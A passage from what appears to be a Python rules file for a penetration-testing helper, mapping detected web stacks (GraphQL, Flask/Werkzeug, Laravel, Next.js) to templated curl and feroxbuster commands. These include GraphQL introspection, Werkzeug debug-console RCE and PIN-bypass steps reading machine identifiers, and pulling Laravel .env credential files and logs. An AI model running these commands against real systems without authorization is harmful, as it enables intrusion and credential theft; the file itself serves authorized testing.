      "  -d '{\"query\":\"{__schema{types{name fields{name type{name}}}}}\"}' | jq .",
      "# 2. Full introspection for GraphQL Voyager / visualization:",
      "curl -sS '{url}graphql' -X POST -H 'Content-Type: application/json' \\",
      "  -d '{\"query\":\"{__schema{queryType{name}mutationType{name}types{kind name fields{name args{name type{kind name ofType{kind name}}}type{kind name ofType{kind name}}}}}}\"}' | jq . > schema.json",
      "# 3. Check for introspection bypass (some apps disable it):",
      "curl -sS '{url}graphql' -X POST -H 'Content-Type: application/json' -d '{\"query\":\"query{__typename}\"}'",
      "# 4. Test for query batching / CSRF:",
      "curl -sS '{url}graphql' -X POST -H 'Content-Type: application/json' -d '[{\"query\":\"{__typename}\"},{\"query\":\"{__typename}\"}]'",
      "# 5. Common mutation enumeration:",
      "curl -sS '{url}graphql' -X POST -H 'Content-Type: application/json' -d '{\"query\":\"mutation{__typename}\"}'",
      "# 6. Security scanner:",
      "# graphql-cop is NOT allowed on OSCP+ (automated scanner). Use manual checks above.",
    ]
  },
  # ============================================================================
  # FLASK DEBUG MODE
  # ============================================================================
  {
    "name": "Flask / Werkzeug debug mode",
    "tags_any": ["flask_debug"],
    "commands": [
      "# Flask Werkzeug debugger detected - potential RCE!",
      "curl -sS '{url}console'  # Werkzeug interactive console (RCE if PIN bypass works)",
      "# PIN Brute-force (requires /proc access on target):",
      "# 1. Get machine-id: cat /proc/sys/kernel/random/boot_id (or /etc/machine-id)",
      "# 2. Get MAC: cat /sys/class/net/ens*/address",
      "# 3. Use Werkzeug PIN generator: https://github.com/wdahlenburg/werkzeug-debug-console-bypass",
      "curl -sS '{url}' -H 'X-Forwarded-For: 127.0.0.1'  # check if debug page leaks PIN",
    ]
  },
  # ============================================================================
  # LARAVEL
  # ============================================================================
  {
    "name": "Laravel application",
    "tags_any": ["laravel"],
    "commands": [
      "# Laravel detected",
      "curl -sS '{url}.env' | head -50  # .env file (credentials!)",
      "curl -sS '{url}storage/logs/laravel.log' | tail -100  # debug log",
      "curl -sS '{url}phpinfo.php' | head -20",
      "# Laravel debug mode check (APP_DEBUG=true leaks full stack traces):",
      "curl -sS '{url}%00' -v 2>&1 | grep -iE 'laravel|exception|trace'",
      "feroxbuster -u '{url}' -x php,blade.php,blade --extract-links -C 404 -t 30 -w /usr/share/seclists/Discovery/Web-Content/Laravel.txt",
      "# API routes often at /api/:",
      "curl -sS '{url}api/' | jq .",
      "feroxbuster -u '{url}api/' -x json,php -t 30 -w {wl_api}"
    ]
  },
  # ============================================================================
  # NEXT.JS / REACT SSR
  # ============================================================================
  {
    "name": "Next.js / React SSR",
    "tags_any": ["nextjs"],
    "commands": [
      "# Next.js application detected",
      "curl -sS '{url}_next/static/chunks/' | head -50  # JS bundle list",
      "curl -sS '{url}api/' | jq .  # Next.js API routes",
      "# Extract API routes from JS bundles:",
      "curl -sS '{url}' | grep -oE '\"(/api/[^\"]+)\"' | sort -u | head -30",
      "# Check for exposed server-side props with credentials:",
      "curl -sS '{url}_next/data/' | jq .  # static props",
      "feroxbuster -u '{url}api/' --extract-links -C 404 -t 30 -w {wl_api}",
      "feroxbuster -u '{url}' -C 404 -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt"
    ]
  },
]

# Per-stack extensions. Keep small by default; user can extend via rules file.
_EXT_SETS = {
  "generic": ["txt","html","js","css","json","xml"],
  "php": ["php","phtml","phps","inc","bak","old"],
  "wordpress": ["php","txt","html","js","css","json","xml","bak","old"],
  "iis": ["aspx","asp","ashx","asmx","axd","svc","config","bak","old"],
  "aspnet": ["aspx","asp","ashx","asmx","axd","svc","config","bak","old"],
  "sharepoint": ["aspx","ashx","svc","config","bak","old"],
  "java": ["jsp","do","action","bak","old"],
  "node": ["js","json","map","bak","old"],
  "coldfusion": ["cfm","cfml","cfc","bak","old"],
}
